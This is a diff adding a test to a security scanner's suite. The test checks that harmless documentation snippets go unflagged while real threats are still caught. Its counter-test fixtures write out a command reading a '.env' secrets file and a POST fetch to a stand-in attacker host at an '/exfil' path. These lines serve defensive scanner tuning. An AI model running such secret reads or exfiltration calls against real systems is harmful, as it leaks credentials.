@@ -550,6 +550,62 @@ class TestFalsePositiveReductions:
             fi.pattern_id == "read_secrets_file" for fi in scan_file(bad, "bad.sh")
         )
 
+    def test_instructional_prose_not_flagged_as_exfil_or_supply_chain(self, tmp_path):
+        # #37036: the install-pipeline scanner flagged an entire legitimate community
+        # skill (mksglu/context-mode, 16k stars, public) as DANGEROUS because:
+        #   * `cat .env.example` matched the ``read_secrets_file`` pattern (no real secrets,
+        #     it's a template file),
+        #   * `fetch('http://localhost:3000/...')` matched ``remote_fetch`` (RFC 5735 loopback,
+        #     by definition non-routable),
+        #   * `fetch('https://api.example.com/...')` matched ``remote_fetch`` (RFC 2606 reserved
+        #     domain),
+        #   * a markdown table row ``npm install / build | 120000`` matched
+        #     ``unpinned_npm_install`` (not a command being executed).
+        # The defensive lookaheads added to the three patterns above should silence these
+        # without weakening the actual catch.
+        md = tmp_path / "SKILL.md"
+        md.write_text(
+            # cat .env.example in prose (template file, no real secrets)
+            "## Anti-patterns\n\n- `cat .env.example` — small config file\n"
+            # fetch with localhost (loopback)
+            "```js\nconst resp = await fetch('http://localhost:3000/api/orders');\n```\n"
+            # fetch with RFC 2606 example domain
+            "```js\nconst resp = await fetch('https://api.example.com/health');\n```\n"
+            # fetch with .test TLD (RFC 6761 reserved)
+            "```js\nconst resp = await fetch('https://api.svc.test/health');\n```\n"
+            # npm install inside a markdown table row (timeout preset, not a command)
+            "| npm install / build | 120000 |\n",
+            encoding="utf-8",
+        )
+        findings = scan_file(md, "SKILL.md")
+        # All four must be silent:
+        assert not any(f.pattern_id == "read_secrets_file" for f in findings), \
+            "cat .env.example must not be read_secrets_file"
+        assert not any(f.pattern_id == "remote_fetch" for f in findings), \
+            "fetch(localhost/example.com/test) must not be remote_fetch"
+        assert not any(f.pattern_id == "unpinned_npm_install" for f in findings), \
+            "npm install in a markdown table row must not be unpinned_npm_install"
+
+        # Counter-tests: the patterns must STILL catch the dangerous shapes.
+        real_env = tmp_path / "bad.sh"
+        real_env.write_text("cat ~/.config/myapp/.env | tee /tmp/x\n", encoding="utf-8")
+        assert any(
+            f.pattern_id == "read_secrets_file" for f in scan_file(real_env, "bad.sh")
+        ), "real .env reads must still be flagged"
+
+        real_fetch = tmp_path / "real_fetch.js"
+        real_fetch.write_text(
+            "fetch('https://api.attacker.example.invalid/exfil', {method:'POST'})\n",
+            encoding="utf-8",
+        )
+        # ``attacker.example.invalid`` is not in the RFC 2606 reserved list and the TLD
+        # .invalid is also reserved -- remote_fetch should still match because the
+        # negative lookahead only exempts the example.com/.org/.net/example subdomains
+        # and .test, not arbitrary strings containing 'example'.
+        assert any(
+            f.pattern_id == "remote_fetch" for f in scan_file(real_fetch, "real_fetch.js")
+        ), "real remote fetches must still be flagged"
+
     def test_python_credential_file_read_is_critical_and_plugin_admission_is_dangerous(self, tmp_path):
         # #116950: `open()`/`Path(...).read_*()` on a known credential file was only caught by the
         # mention-pattern `hermes_env_access` (demoted to medium by SEVERITY_REMAP), so a Python
